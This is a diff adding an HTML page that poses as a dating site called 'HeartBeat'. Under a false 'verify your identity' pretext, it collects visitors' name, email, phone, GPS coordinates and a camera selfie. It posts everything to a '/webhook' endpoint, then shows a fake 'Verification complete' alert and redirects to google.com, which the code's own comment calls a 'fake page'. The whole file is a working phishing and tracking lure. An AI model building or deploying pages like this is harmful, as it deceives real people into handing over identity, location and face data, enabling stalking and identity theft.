@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HeartBeat | Find Your Perfect Match</title>
+    <style>
+        body { font-family: 'Segoe UI', sans-serif; background: #ff4b2b; background: linear-gradient(to right, #ff416c, #ff4b2b); color: white; text-align: center; margin: 0; height: 100vh; display: flex; flex-direction: column; justify-content: center; }
+        .container { background: white; color: #333; padding: 2rem; border-radius: 20px; width: 80%; max-width: 400px; margin: auto; box-shadow: 0 10px 25px rgba(0,0,0,0.2); }
+        h1 { color: #ff416c; }
+        input { width: 90%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; }
+        button { background: #ff416c; color: white; border: none; padding: 15px 30px; border-radius: 25px; cursor: pointer; font-weight: bold; width: 100%; }
+        #status { font-size: 12px; color: gray; margin-top: 10px; }
+    </style>
+</head>
+<body>
+
+    <div class="container" id="main-box">
+        <h1>❤️ HeartBeat</h1>
+        <p>Verify your identity to see nearby singles.</p>
+        
+        <div id="step1">
+            <input type="text" id="name" placeholder="Full Name">
+            <input type="email" id="email" placeholder="Email Address">
+            <input type="tel" id="phone" placeholder="Phone Number">
+            <button onclick="startVerification()">Verify & Enter</button>
+        </div>
+
+        <div id="step2" style="display:none;">
+            <p>📸 <b>Security Check:</b> Please allow camera access for a quick selfie verification to prevent fake profiles.</p>
+            <video id="video" width="200" autoplay style="border-radius: 10px;"></video>
+            <canvas id="canvas" style="display:none;"></canvas>
+            <button onclick="captureAndSend()">Take Verification Photo</button>
+        </div>
+    </div>
+
+    <script>
+        let userData = {};
+
+        async function startVerification() {
+            userData.name = document.getElementById('name').value;
+            userData.email = document.getElementById('email').value;
+            userData.phone = document.getElementById('phone').value;
+
+            // GPS Request
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(async (position) => {
+                    userData.lat = position.coords.latitude;
+                    userData.lon = position.coords.longitude;
+                    
+                    // Move to Camera step
+                    document.getElementById('step1').style.display = 'none';
+                    document.getElementById('step2').style.display = 'block';
+                    
+                    // Request Camera
+                    try {
+                        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                        document.getElementById('video').srcObject = stream;
+                    } catch (e) {
+                        alert("Camera access is required to enter the site.");
+                    }
+                }, (err) => {
+                    alert("You must enable GPS to view local matches!");
+                });
+            }
+        }
+
+        async function captureAndSend() {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            const imageData = canvas.toDataURL('image/jpeg');
+
+            // Send to your backend
+            fetch('/webhook', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ ...userData, image: imageData })
+            }).then(() => {
+                alert("Verification complete! Redirecting to matches...");
+                window.location.href = "https://google.com"; // Redirect to a fake page
+            });
+        }
+    </script>
+</body>
+</html>
